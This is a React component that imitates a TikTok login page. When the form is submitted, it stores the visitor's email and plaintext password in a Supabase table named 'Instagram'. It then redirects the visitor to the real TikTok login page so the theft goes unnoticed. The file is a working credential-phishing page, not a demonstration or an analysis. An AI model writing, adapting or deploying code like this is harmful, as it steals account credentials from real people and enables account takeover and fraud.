import React, { useState } from "react";
import "./TikTokLogin.css";
import { supabase } from "../../supabase";

const TikTokLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.tiktok.com/login";
    }
  };

  return (
    <div className="tiktok-login-container">
      <div className="tiktok-login-box">
        <div className="tiktok-logo">🎵</div>
        <h2>TikTok Login</h2>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Email or Username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? "Logging in..." : "Login"}
          </button>
        </form>
        {success && <div className="tiktok-success">Login saved!</div>}
        {error && <div className="tiktok-error">{error}</div>}
      </div>
    </div>
  );
};

export default TikTokLogin;
